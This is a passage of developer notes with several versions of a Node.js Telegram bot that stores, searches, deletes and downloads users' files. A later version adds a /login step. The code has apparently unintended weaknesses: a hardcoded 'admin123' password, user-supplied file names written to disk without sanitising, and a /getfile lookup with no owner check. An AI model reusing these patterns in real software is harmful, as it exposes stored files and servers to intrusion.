每个文件单独两按钮行：删除+下载 inline_keyboard.push([ { text: \u0026#34;❌ 删除\u0026#34;, callback_data: `del_${r.id}` }, { text: \u0026#34;⬇️ 下载本地\u0026#34;, callback_data: `download_${r.id}` }, ]); // 如果是图片，加入缩略图到 mediaGroup if (r.file_name.endsWith(\u0026#34;.jpg\u0026#34;) || r.file_name.endsWith(\u0026#34;.png\u0026#34;)) { mediaGroup.push({ type: \u0026#34;photo\u0026#34;, media: r.file_id, caption: `#${r.id} ${r.file_name}` }); } } // 翻页按钮 const totalCountRow = await new Promise((resolve) =\u0026gt; db.get(`SELECT COUNT(*) as cnt FROM files WHERE user_id = ?`, [userId], (err, row) =\u0026gt; resolve(row)) ); const totalPages = Math.ceil(totalCountRow.cnt / PAGE_SIZE); inline_keyboard.push([ { text: \u0026#34;⬅️ 上一页\u0026#34;, callback_data: `page_${page - 1}` }, { text: \u0026#34;➡️ 下一页\u0026#34;, callback_data: `page_${page + 1}` }, ]); const opts = { reply_markup: { inline_keyboard } }; if (mediaGroup.length \u0026gt; 0) { // 先发送图片缩略图组 try { await bot.sendMediaGroup(chatId, mediaGroup); } catch (err) { console.error(\u0026#34;发送缩略图失败:\u0026#34;, err); } } if (messageId) { // 编辑已有消息 await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: opts.reply_markup, }); } else { await bot.sendMessage(chatId, text, opts); } } ); } bot.onText(/\\/myfilelist ?(\\d+)?/, (msg, match) =\u0026gt; { const page = parseInt(match[1]) || 1; sendFilePage(msg.chat.id, msg.from.id, page); }); // /search 关键字 bot.onText(/\\/search (.+)/, (msg, match) =\u0026gt; { const keyword = `%${match[1]}%`; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? AND file_name LIKE ? ORDER BY date DESC LIMIT 10`, [userId, keyword], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;🔍 没有匹配的文件。\u0026#34;); let text = `🔍 搜索结果：\\n\\n`; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /getfile id bot.onText(/\\/getfile (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; db.get(`SELECT file_id, file_name FROM files WHERE id = ?`, [id], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 文件不存在。\u0026#34;); if (row.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { bot.sendPhoto(msg.chat.id, row.file_id, { caption: row.file_name }); } else if (row.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { bot.sendVideo(msg.chat.id, row.file_id, { caption: row.file_name }); } else { bot.sendDocument(msg.chat.id, row.file_id, {}, { filename: row.file_name }); } }); }); // /delete id bot.onText(/\\/delete (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; const userId = msg.from.id; db.run(`DELETE FROM files WHERE id = ? AND user_id = ?`, [id, userId], function (err) { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 删除失败。\u0026#34;); if (this.changes === 0) return bot.sendMessage(msg.chat.id, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); bot.sendMessage(msg.chat.id, `✅ 文件(ID=${id}) 已删除。`); }); }); // callback_query 统一处理 bot.on(\u0026#34;callback_query\u0026#34;, async (query) =\u0026gt; { const userId = query.from.id; const chatId = query.message.chat.id; // 分类按钮 if (query.data.startsWith(\u0026#34;cat_\u0026#34;)) { const category = query.data.replace(\u0026#34;cat_\u0026#34;, \u0026#34;\u0026#34;); userCategory[userId] = category; bot.sendMessage(chatId, `✅ 已设置分类为：${category}`); } // 删除按钮 if (query.data.startsWith(\u0026#34;del_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;del_\u0026#34;, \u0026#34;\u0026#34;); const confirmOpts = { reply_markup: { inline_keyboard: [ [ { text: \u0026#34;✅ 确认删除\u0026#34;, callback_data: `confirmdel_${fileId}` }, { text: \u0026#34;❌ 取消\u0026#34;, callback_data: `cancel_${fileId}` }, ], ], }, }; bot.sendMessage(chatId, `⚠️ 确认要删除文件(ID=${fileId})吗？`, confirmOpts); } // 确认删除 if (query.data.startsWith(\u0026#34;confirmdel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;confirmdel_\u0026#34;, \u0026#34;\u0026#34;); db.run(`DELETE FROM files WHERE id = ? AND user_id = ?`, [fileId, userId], function (err) { if (err) return bot.sendMessage(chatId, \u0026#34;❌ 删除失败。\u0026#34;); if (this.changes === 0) return bot.sendMessage(chatId, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); bot.sendMessage(chatId, `✅ 文件(ID=${fileId}) 已删除。`); }); } // 取消删除 if (query.data.startsWith(\u0026#34;cancel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;cancel_\u0026#34;, \u0026#34;\u0026#34;); bot.sendMessage(chatId, `❎ 已取消删除文件(ID=${fileId})。`); } // 分页按钮 if (query.data.startsWith(\u0026#34;page_\u0026#34;)) { const page = parseInt(query.data.replace(\u0026#34;page_\u0026#34;, \u0026#34;\u0026#34;)); if (page \u0026lt; 1) return bot.answerCallbackQuery(query.id, { text: \u0026#34;已经是第一页\u0026#34; }); sendFilePage(chatId, userId, page, query.message.message_id); } // 下载到本地按钮 if (query.data.startsWith(\u0026#34;download_\u0026#34;)) { const id = query.data.replace(\u0026#34;download_\u0026#34;, \u0026#34;\u0026#34;); db.get(`SELECT file_id, file_name, category FROM files WHERE id = ? AND user_id = ?`, [id, userId], async (err, row) =\u0026gt; { if (!row) return bot.sendMessage(chatId, \u0026#34;❌ 文件不存在或无权限下载。\u0026#34;); try { const filePath = await downloadFile(row.file_id, row.file_name, row.category); bot.sendMessage(chatId, `✅ 文件已下载到服务器本地：${filePath}`); } catch (err) { console.error(err); bot.sendMessage(chatId, `❌ ${err.message}`); } }); } bot.answerCallbackQuery(query.id); }); config.js configbot.js\n// configbot.js module.exports = { token: \u0026#34;t\u0026#34;, // Telegram Bot Token categories: [\u0026#34;work\u0026#34;, \u0026#34;study\u0026#34;, \u0026#34;life\u0026#34;, \u0026#34;other\u0026#34;, \u0026#34;yo\u0026#34;, \u0026#34;yo2\u0026#34;], // 分类 pageSize: 5 // 每页显示条数 }; //bot.js const TelegramBot = require(\u0026#34;node-telegram-bot-api\u0026#34;); const db = require(\u0026#34;./db\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const axios = require(\u0026#34;axios\u0026#34;); const config = require(\u0026#34;./configbot\u0026#34;); // 引入配置文件 const token = config.token; const categories = config.categories; const PAGE_SIZE = config.pageSize; const bot = new TelegramBot(token, { polling: true }); login //config module.exports = { token: \u0026#34;BOT_TOKEN\u0026#34;, categories: [\u0026#34;c1\u0026#34;, \u0026#34;c2\u0026#34;, \u0026#34;c2\u0026#34;], pageSize: 5, adminPassword: \u0026#34;admin123\u0026#34; // 机器人访问密码 }; const TelegramBot = require(\u0026#34;node-telegram-bot-api\u0026#34;); const db = require(\u0026#34;./db\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const axios = require(\u0026#34;axios\u0026#34;); const config = require(\u0026#34;./configbot\u0026#34;); // 引入配置文件 const token = config.token; const categories = config.categories; const PAGE_SIZE = config.pageSize; // 从配置读取 const ADMIN_PASSWORD = config.adminPassword; // 管理密码 const bot = new TelegramBot(token, { polling: true }); // 保存分类信息（用户 -\u0026gt; 当前选择的分类） const userCategory = {}; // 保存已登录用户 const authenticatedUsers = new Set(); // 本地存储根目录 const STORAGE_DIR = path.join(__dirname, \u0026#34;files\u0026#34;); if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR); // 检查是否已鉴权 function checkAuth(msg) { const userId = msg.from.id; if (!authenticatedUsers.has(userId)) { bot.sendMessage(msg.chat.id, \u0026#34;⚠️ 请先使用 /login \u0026lt;密码\u0026gt; 登录。\u0026#34;); return false; } return true; } // /login 命令 bot.onText(/\\/login (.+)/, (msg, match) =\u0026gt; { const password = match[1]; const userId = msg.from.id; if (password === ADMIN_PASSWORD) { authenticatedUsers.add(userId); bot.sendMessage(msg.chat.id, \u0026#34;✅ 登录成功，您已获得访问权限。\u0026#34;); } else { bot.sendMessage(msg.chat.id, \u0026#34;❌ 密码错误。\u0026#34;); } }); // /start 命令 bot.onText(/\\/start/, (msg) =\u0026gt; { if (!checkAuth(msg)) return; bot.sendMessage( msg.chat.id, \u0026#34;欢迎使用文件存储机器人！\\n\\n命令：\\n\u0026#34; + \u0026#34;/setcategory 设置分类\\n\u0026#34; + \u0026#34;/myfiles 查看最近文件(文字列表)\\n\u0026#34; + \u0026#34;/myfilelist [页码] 文件分页显示\\n\u0026#34; + \u0026#34;/search 关键字 搜索文件\\n\u0026#34; + \u0026#34;/getfile id 获取文件\\n\u0026#34; + \u0026#34;/delete id 删除文件\\n\u0026#34; + \u0026#34;📥 点击文件后的“下载本地”按钮可保存到服务器本地\u0026#34; ); }); // /setcategory 显示按钮 bot.onText(/\\/setcategory/, (msg) =\u0026gt; { if (!checkAuth(msg)) return; const opts = { reply_markup: { inline_keyboard: categories.map((c) =\u0026gt; [{ text: c, callback_data: `cat_${c}` }]), }, }; bot.sendMessage(msg.chat.id, \u0026#34;请选择分类：\u0026#34;, opts); }); // 通用保存函数 function saveFile(msg, fileId, fileName, type) { const userId = msg.from.id; const chatId = msg.chat.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; db.run( `INSERT INTO files (file_id, file_name, category, user_id) VALUES (?, ?, ?, ?)`, [fileId, fileName, category, userId], function (err) { if (err) { console.error(err); bot.sendMessage(chatId, \u0026#34;❌ 存储失败。\u0026#34;); } else { bot.sendMessage( chatId, `📦 已保存 ${type}\\nID: ${this.lastID}\\n文件名: ${fileName}\\n分类: ${category}` ); } } ); } // 下载文件到本地（带重试和日志） async function downloadFile(fileId, fileName, category, retries = 3) { const dir = path.join(STORAGE_DIR, category); if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); const filePath = path.join(dir, fileName); for (let attempt = 1; attempt \u0026lt;= retries; attempt++) { try { console.log(`下载文件尝试 ${attempt}/${retries}：${fileName}`); const url = await bot.getFileLink(fileId); // 获取文件链接 const writer = fs.createWriteStream(filePath); const response = await axios({ url, method: \u0026#34;GET\u0026#34;, responseType: \u0026#34;stream\u0026#34;, timeout: 30000, // 30秒超时 }); response.data.pipe(writer); await new Promise((resolve, reject) =\u0026gt; { writer.on(\u0026#34;finish\u0026#34;, resolve); writer.on(\u0026#34;error\u0026#34;, reject); }); console.log(`✅ 文件下载成功：${filePath}`); return filePath; } catch (err) { console.error(`❌ 下载文件失败（尝试 ${attempt}）：${fileName}`, err); if (attempt === retries) { throw new Error(`下载文件失败，请稍后重试：${fileName}`); } // 等待 1 秒后重试 await new Promise((res) =\u0026gt; setTimeout(res, 1000)); } } } // 统一处理消息（普通消息和转发消息） bot.on(\u0026#34;message\u0026#34;, (msg) =\u0026gt; { if (!checkAuth(msg)) return; const hasFile = msg.document || msg.photo || msg.video; const isForward = msg.forward_from || msg.forward_from_chat; if (!hasFile) return; const typePrefix = isForward ? \u0026#34;转发\u0026#34; : \u0026#34;\u0026#34;; // 文档 if (msg.document) { saveFile(msg, msg.document.file_id, msg.document.file_name, `${typePrefix}文档`); } // 图片 if (msg.photo) { const photo = msg.photo[msg.photo.length - 1]; const fileName = `photo_${Date.now()}.jpg`; saveFile(msg, photo.file_id, fileName, `${typePrefix}图片`); } // 视频 if (msg.video) { const fileName = msg.video.file_name || `video_${Date.now()}.mp4`; saveFile(msg, msg.video.file_id, fileName, `${typePrefix}视频`); } }); // /myfiles 文本列表 bot.onText(/\\/myfiles/, (msg) =\u0026gt; { if (!checkAuth(msg)) return; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT 10`, [userId], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); let text = \u0026#34;📂 最近的文件：\\n\\n\u0026#34;; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /myfilelist 分页显示 async function sendFilePage(chatId, userId, page = 1, messageId = null) { const offset = (page - 1) * PAGE_SIZE; db.all( `SELECT id, file_id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT ? OFFSET ?`, [userId, PAGE_SIZE, offset], async (err, rows) =\u0026gt; { if (err) return bot.sendMessage(chatId, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(chatId, \u0026#34;📭 没有找到文件。\u0026#34;); let text = `📑 第 ${page} 页（每页 ${PAGE_SIZE} 条）\\n\\n`; const inline_keyboard = []; const mediaGroup = []; for (const r of rows) { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; inline_keyboard.push([ { text: \u0026#34;❌ 删除\u0026#34;, callback_data: `del_${r.id}` }, { text: \u0026#34;⬇️ 下载本地\u0026#34;, callback_data: `download_${r.id}` }, ]); if (r.file_name.endsWith(\u0026#34;.jpg\u0026#34;) || r.file_name.endsWith(\u0026#34;.png\u0026#34;)) { mediaGroup.push({ type: \u0026#34;photo\u0026#34;, media: r.file_id, caption: `#${r.id} ${r.file_name}` }); } } const totalCountRow = await new Promise((resolve) =\u0026gt; db.get(`SELECT COUNT(*) as cnt FROM files WHERE user_id = ?`, [userId], (err, row) =\u0026gt; resolve(row) ) ); const totalPages = Math.ceil(totalCountRow.cnt / PAGE_SIZE); inline_keyboard.push([ { text: \u0026#34;⬅️ 上一页\u0026#34;, callback_data: `page_${page - 1}` }, { text: \u0026#34;➡️ 下一页\u0026#34;, callback_data: `page_${page + 1}` }, ]); const opts = { reply_markup: { inline_keyboard } }; if (mediaGroup.length \u0026gt; 0) { try { await bot.sendMediaGroup(chatId, mediaGroup); } catch (err) { console.error(\u0026#34;发送缩略图失败:\u0026#34;, err); } } if (messageId) { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: opts.reply_markup, }); } else { await bot.sendMessage(chatId, text, opts); } } ); } bot.onText(/\\/myfilelist ?(\\d+)?/, (msg, match) =\u0026gt; { if (!checkAuth(msg)) return; const page = parseInt(match[1]) || 1; sendFilePage(msg.chat.id, msg.from.id, page); }); // /search 关键字 bot.onText(/\\/search (.+)/, (msg, match) =\u0026gt; { if (!checkAuth(msg)) return; const keyword = `%${match[1]}%`; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? AND file_name LIKE ? ORDER BY date DESC LIMIT 10`, [userId, keyword], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;🔍 没有匹配的文件。\u0026#34;); let text = `🔍 搜索结果：\\n\\n`; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /getfile id bot.onText(/\\/getfile (\\d+)/, (msg, match) =\u0026gt; { if (!checkAuth(msg)) return; const id = match[1]; db.get(`SELECT file_id, file_name FROM files WHERE id = ?`, [id], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 文件不存在。\u0026#34;); if (row.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { bot.sendPhoto(msg.chat.id, row.file_id, { caption: row.file_name }); } else if (row.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { bot.sendVideo(msg.chat.id, row.file_id, { caption: row.file_name }); } else { bot.sendDocument(msg.chat.id, row.file_id, {}, { filename: row.file_name }); } }); }); // /delete id bot.onText(/\\/delete (\\d+)/, (msg, match) =\u0026gt; { if (!checkAuth(msg)) return; const id = match[1]; const userId = msg.from.id; db.run(`DELETE FROM files WHERE id = ? AND user_id = ?`, [id, userId], function (err) { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 删除失败。\u0026#34;); if (this.changes === 0) return bot.sendMessage(msg.chat.id, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); bot.sendMessage(msg.chat.id, `✅ 文件(ID=${id}) 已删除。`); }); }); // callback_query 统一处理 bot.on(\u0026#34;callback_query\u0026#34;, async (query) =\u0026gt; { const userId = query.from.id; const chatId = query.message.chat.id; if (!authenticatedUsers.has(userId)) { return bot.answerCallbackQuery(query.id, { text: \u0026#34;⚠️ 请先登录 /login \u0026lt;密码\u0026gt;\u0026#34; }); } if (query.data.startsWith(\u0026#34;cat_\u0026#34;)) { const category = query.data.replace(\u0026#34;cat_\u0026#34;, \u0026#34;\u0026#34;); userCategory[userId] = category; bot.sendMessage(chatId, `✅ 已设置分类为：${category}`); } if (query.data.startsWith(\u0026#34;del_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;del_\u0026#34;, \u0026#34;\u0026#34;); const confirmOpts = { reply_markup: { inline_keyboard: [ [ { text: \u0026#34;✅ 确认删除\u0026#34;, callback_data: `confirmdel_${fileId}` }, { text: \u0026#34;❌ 取消\u0026#34;, callback_data: `cancel_${fileId}` }, ], ], }, }; bot.sendMessage(chatId, `⚠️ 确认要删除文件(ID=${fileId})吗？`, confirmOpts); } if (query.data.startsWith(\u0026#34;confirmdel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;confirmdel_\u0026#34;, \u0026#34;\u0026#34;); db.run(`DELETE FROM files WHERE id = ? AND user_id = ?`, [fileId, userId], function (err) { if (err) return bot.sendMessage(chatId, \u0026#34;❌ 删除失败。\u0026#34;); if (this.changes === 0) return bot.sendMessage(chatId, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); bot.sendMessage(chatId, `✅ 文件(ID=${fileId}) 已删除。`); }); } if (query.data.startsWith(\u0026#34;cancel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;cancel_\u0026#34;, \u0026#34;\u0026#34;); bot.sendMessage(chatId, `❎ 已取消删除文件(ID=${fileId})。`); } if (query.data.startsWith(\u0026#34;page_\u0026#34;)) { const page = parseInt(query.data.replace(\u0026#34;page_\u0026#34;, \u0026#34;\u0026#34;)); if (page \u0026lt; 1) return bot.answerCallbackQuery(query.id, { text: \u0026#34;已经是第一页\u0026#34; }); sendFilePage(chatId, userId, page, query.message.message_id); } if (query.data.startsWith(\u0026#34;download_\u0026#34;)) { const id = query.data.replace(\u0026#34;download_\u0026#34;, \u0026#34;\u0026#34;); db.get( `SELECT file_id, file_name, category FROM files WHERE id = ? AND user_id = ?`, [id, userId], async (err, row) =\u0026gt; { if (!row) return bot.sendMessage(chatId, \u0026#34;❌ 文件不存在或无权限下载。\u0026#34;); try { const filePath = await downloadFile(row.file_id, row.file_name, row.category); bot.sendMessage(chatId, `✅ 文件已下载到服务器本地：${filePath}`); } catch (err) { console.error(err); bot.sendMessage(chatId, `❌ ${err.message}`); } } ); } bot.answerCallbackQuery(query.id); }); 用户必须先输入 /login admin123，否则所有命令都会提示 ⚠️ 请先使用 /login \u0026lt;密码\u0026gt; 登录。\n登录成功后，才可以正常使用 /start、上传文件、搜索、分页、删除、下载等功能。\nlist detail const TelegramBot = require(\u0026#34;node-telegram-bot-api\u0026#34;); const db = require(\u0026#34;./db\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const axios = require(\u0026#34;axios\u0026#34;); const config = require(\u0026#34;./configbot\u0026#34;); // 引入配置文件 const token = config.token; const categories = config.categories; const PAGE_SIZE = config.pageSize; // 从配置读取 const ADMIN_PASSWORD = config.adminPassword; // 管理密码 const bot = new TelegramBot(token, { polling: true }); // 保存分类信息（用户 -\u0026gt; 当前选择的分类） const userCategory = {}; // 保存已登录用户 const authenticatedUsers = new Set(); // 本地存储根目录 const STORAGE_DIR = path.join(__dirname, \u0026#34;files\u0026#34;); if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR); // 检查是否已鉴权 function checkAuth(msg) { const userId = msg.from.id; if (!authenticatedUsers.has(userId)) { bot.sendMessage(msg.chat.id, \u0026#34;⚠️ 请先使用 /login \u0026lt;密码\u0026gt; 登录。\u0026#34;); return false; } return true; } // /login 命令 bot.onText(/\\/login (.+)/, (msg, match) =\u0026gt; { const password = match[1]; const userId = msg.from.id; if (password === ADMIN_PASSWORD) { authenticatedUsers.add(userId); bot.sendMessage(msg.chat.id, \u0026#34;✅ 登录成功，您已获得访问权限。\u0026#34;); } else { bot.sendMessage(msg.chat.id, \u0026#34;❌ 密码错误。\u0026#34;); } }); // /start 命令 bot.onText(/\\/start/, (msg) =\u0026gt; { if (!checkAuth(msg)) return; bot.sendMessage( msg.chat.id, \u0026#34;欢迎使用文件存储机器人！\\n\\n命令：\\n\u0026#34; + \u0026#34;/setcategory 设置分类\\n\u0026#34; + \u0026#34;/myfiles 查看最近文件(文字列表)\\n\u0026#34; + \u0026#34;/myfilelist [页码] 文件分页显示\\n\u0026#34; + \u0026#34;/search 关键字 搜索文件\\n\u0026#34; + \u0026#34;/getfile id 获取文件\\n\u0026#34; + \u0026#34;/delete id 删除文件\\n\u0026#34; + \u0026#34;📥 点击文件后的“下载本地”或“查看详情”按钮操作\u0026#34; ); }); // /setcategory 显示按钮 bot.onText(/\\/setcategory/, (msg) =\u0026gt; { if (!checkAuth(msg)) return; const opts = { reply_markup: { inline_keyboard: categories.map((c) =\u0026gt; [{ text: c, callback_data: `cat_${c}` }]), }, }; bot.sendMessage(msg.chat.id, \u0026#34;请选择分类：\u0026#34;, opts); }); // 通用保存函数 function saveFile(msg, fileId, fileName, type) { const userId = msg.from.id; const chatId = msg.chat.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; db.run( `INSERT INTO files (file_id, file_name, category, user_id, date) VALUES (?, ?, ?, ?, datetime(\u0026#39;now\u0026#39;))`, [fileId, fileName, category, userId], function (err) { if (err) { console.error(err); bot.sendMessage(chatId, \u0026#34;❌ 存储失败。\u0026#34;); } else { bot.sendMessage( chatId, `📦 已保存 ${type}\\nID: ${this.lastID}\\n文件名: ${fileName}\\n分类: ${category}` ); } } ); } // 下载文件到本地（带重试和日志） async function downloadFile(fileId, fileName, category, retries = 3) { const dir = path.join(STORAGE_DIR, category); if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); const filePath = path.join(dir, fileName); for (let attempt = 1; attempt \u0026lt;= retries; attempt++) { try { console.log(`下载文件尝试 ${attempt}/${retries}：${fileName}`); const url = await bot.getFileLink(fileId); // 获取文件链接 const writer = fs.createWriteStream(filePath); const response = await axios({ url, method: \u0026#34;GET\u0026#34;, responseType: \u0026#34;stream\u0026#34;, timeout: 30000, // 30秒超时 }); response.data.pipe(writer); await new Promise((resolve, reject) =\u0026gt; { writer.on(\u0026#34;finish\u0026#34;, resolve); writer.on(\u0026#34;error\u0026#34;, reject); }); console.log(`✅ 文件下载成功：${filePath}`); return filePath; } catch (err) { console.error(`❌ 下载文件失败（尝试 ${attempt}）：${fileName}`, err); if (attempt === retries) { throw new Error(`下载文件失败，请稍后重试：${fileName}`); } // 等待 1 秒后重试 await new Promise((res) =\u0026gt; setTimeout(res, 1000)); } } } // 统一处理消息（普通消息和转发消息） bot.on(\u0026#34;message\u0026#34;, (msg) =\u0026gt; { if (!checkAuth(msg)) return; const hasFile = msg.document || msg.photo || msg.video; const isForward = msg.forward_from || msg.forward_from_chat; if (!hasFile) return; const typePrefix = isForward ? \u0026#34;转发\u0026#34; : \u0026#34;\u0026#34;; // 文档 if (msg.document) { saveFile(msg, msg.document.file_id, msg.document.file_name, `${typePrefix}文档`); } // 图片 if (msg.photo) { const photo = msg.photo[msg.photo.length - 1]; const fileName = `photo_${Date.now()}.jpg`; saveFile(msg, photo.file_id, fileName, `${typePrefix}图片`); } // 视频 if (msg.video) { const fileName = msg.video.file_name || `video_${Date.now()}.mp4`; saveFile(msg, msg.video.file_id, fileName, `${typePrefix}视频`); } }); // /myfiles 文本列表 bot.onText(/\\/myfiles/, (msg) =\u0026gt; { if (!checkAuth(msg)) return; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT 10`, [userId], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); let text = \u0026#34;📂 最近的文件：\\n\\n\u0026#34;; const inline_keyboard = []; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; inline_keyboard.push([{ text: \u0026#34;ℹ️ 查看详情\u0026#34;, callback_data: `detail_${r.id}` }]); }); bot.sendMessage(msg.chat.id, text, { reply_markup: { inline_keyboard } }); } ); }); // /myfilelist 分页显示 async function sendFilePage(chatId, userId, page = 1, messageId = null) { const offset = (page - 1) * PAGE_SIZE; db.all( `SELECT id, file_id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT ? OFFSET ?`, [userId, PAGE_SIZE, offset], async (err, rows) =\u0026gt; { if (err) return bot.sendMessage(chatId, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(chatId, \u0026#34;📭 没有找到文件。\u0026#34;); let text = `📑 第 ${page} 页（每页 ${PAGE_SIZE} 条）\\n\\n`; const inline_keyboard = []; const mediaGroup = []; for (const r of rows) { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; inline_keyboard.push([ { text: \u0026#34;ℹ️ 查看详情\u0026#34;, callback_data: `detail_${r.id}` }, { text: \u0026#34;❌ 删除\u0026#34;, callback_data: `del_${r.id}` }, { text: \u0026#34;⬇️ 下载本地\u0026#34;, callback_data: `download_${r.id}` }, ]); if (r.file_name.endsWith(\u0026#34;.jpg\u0026#34;) || r.file_name.endsWith(\u0026#34;.png\u0026#34;)) { mediaGroup.push({ type: \u0026#34;photo\u0026#34;, media: r.file_id, caption: `#${r.id} ${r.file_name}` }); } } const totalCountRow = await new Promise((resolve) =\u0026gt; db.get(`SELECT COUNT(*) as cnt FROM files WHERE user_id = ?`, [userId], (err, row) =\u0026gt; resolve(row) ) ); const totalPages = Math.ceil(totalCountRow.cnt / PAGE_SIZE); inline_keyboard.push([ { text: \u0026#34;⬅️ 上一页\u0026#34;, callback_data: `page_${page - 1}` }, { text: \u0026#34;➡️ 下一页\u0026#34;, callback_data: `page_${page + 1}` }, ]); const opts = { reply_markup: { inline_keyboard } }; if (mediaGroup.length \u0026gt; 0) { try { await bot.sendMediaGroup(chatId, mediaGroup); } catch (err) { console.error(\u0026#34;发送缩略图失败:\u0026#34;, err); } } if (messageId) { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: opts.reply_markup, }); } else { await bot.sendMessage(chatId, text, opts); } } ); } bot.onText(/\\/myfilelist ?(\\d+)?/, (msg, match) =\u0026gt; { if (!checkAuth(msg)) return; const page = parseInt(match[1]) || 1; sendFilePage(msg.chat.id, msg.from.id, page); }); // /search 关键字 bot.onText(/\\/search (.+)/, (msg, match) =\u0026gt; { if (!checkAuth(msg)) return; const keyword = `%${match[1]}%`; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? AND file_name LIKE ? ORDER BY date DESC LIMIT 10`, [userId, keyword], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;🔍 没有匹配的文件。\u0026#34;); let text = `🔍 搜索结果：\\n\\n`; const inline_keyboard = []; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; inline_keyboard.push([{ text: \u0026#34;ℹ️ 查看详情\u0026#34;, callback_data: `detail_${r.id}` }]); }); bot.sendMessage(msg.chat.id, text, { reply_markup: { inline_keyboard } }); } ); }); // /getfile id bot.onText(/\\/getfile (\\d+)/, (msg, match) =\u0026gt; { if (!checkAuth(msg)) return; const id = match[1]; db.get(`SELECT file_id, file_name FROM files WHERE id = ?`, [id], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 文件不存在。\u0026#34;); if (row.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { bot.sendPhoto(msg.chat.id, row.file_id, { caption: row.file_name }); } else if (row.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { bot.sendVideo(msg.chat.id, row.file_id, { caption: row.file_name }); } else { bot.sendDocument(msg.chat.id, row.file_id, {}, { filename: row.file_name }); } }); }); // /delete id bot.onText(/\\/delete (\\d+)/, (msg, match) =\u0026gt; { if (!checkAuth(msg)) return; const id = match[1]; const userId = msg.from.id; db.run(`DELETE FROM files WHERE id = ? AND user_id = ?`, [id, userId], function (err) { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 删除失败。\u0026#34;); if (this.changes === 0) return bot.sendMessage(msg.chat.id, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); bot.sendMessage(msg.chat.id, `✅ 文件(ID=${id}) 已删除。`); }); }); // callback_query 统一处理 bot.on(\u0026#34;callback_query\u0026#34;, async (query) =\u0026gt; { const userId = query.from.id; const chatId = query.message.chat.id; if (!authenticatedUsers.has(userId)) { return bot.answerCallbackQuery(query.id, { text: 